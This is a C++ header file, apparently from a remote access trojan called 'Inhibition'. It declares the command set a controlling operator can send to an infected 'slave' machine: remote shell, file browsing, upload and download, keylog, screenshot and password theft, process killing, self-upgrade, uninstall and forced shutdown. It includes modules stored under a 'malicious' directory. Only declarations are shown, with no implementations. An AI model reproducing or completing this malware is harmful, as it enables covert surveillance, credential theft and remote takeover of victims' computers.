#pragma once

#include <common/Innocence.hpp>
#include <log/Log.hpp>
#include <malicious/Passwords.hpp>
#include <malicious/Keylogger.hpp>
#include <malicious/Screenshot.hpp>
#include "SlaveAbstractFunction.hpp"

namespace Inhibition
{
    class ProgramStartupKey;
    class Screenshot;

    class RemoteShell : public SlaveAbstractFunction
    {
        public:
            virtual void operator()();
    };

    class BrowseFileTree : public SlaveAbstractFunction
    {
        public:
            virtual void operator()();
    };

    class StartDownload : public SlaveAbstractFunction
    {
        public:
            virtual void operator()();
    };

    class StartUpload : public SlaveAbstractFunction
    {
        public:
            virtual void operator()();
    };

    class UninstallClient : public SlaveAbstractFunction
    {
        public:
            virtual void operator()();
    };

    class KillClient : public SlaveAbstractFunction
    {
        public:
            virtual void operator()();
    };

    class UpgradeClient : public SlaveAbstractFunction
    {
        public:
            virtual void operator()();
    };

    class RebootClient : public SlaveAbstractFunction
    {
        public:
            virtual void operator()();
    };

    class SendEmail : public SlaveAbstractFunction
    {
        public:
            virtual void operator()();
    };

    class SendKeylog : public SlaveAbstractFunction
    {
        public:
            virtual void operator()();
    };

    class SendScreenshot : public SlaveAbstractFunction
    {
        public:
            SendScreenshot(Malicious::Screenshot& screenshooter_ref)
            :screenshooter(screenshooter_ref){}
            virtual void operator()();
        private:
            Malicious::Screenshot& screenshooter;
    };

    class SendPasswords : public SlaveAbstractFunction
    {
        public:
            virtual void operator()();
    };

    class SendProcessList : public SlaveAbstractFunction
    {
        public:
            virtual void operator()();
    };

    class KillProcess : public SlaveAbstractFunction
    {
        public:
            virtual void operator()();
    };

    class SendWindowsVersion : public SlaveAbstractFunction
    {
        public:
            virtual void operator()();
    };

    class SendClientName : public SlaveAbstractFunction
    {
        public:
            virtual void operator()();
    };
	
    class Shutdown : public SlaveAbstractFunction
    {
        public:
            virtual void operator()();
    };

    class Reboot : public SlaveAbstractFunction
    {
        public:
            virtual void operator()();
    };

    class Logout : public SlaveAbstractFunction
    {
        public:
            virtual void operator()();
    };

    class Hibernate : public SlaveAbstractFunction
    {
        public:
            virtual void operator()();
    };

}  // Inhibition
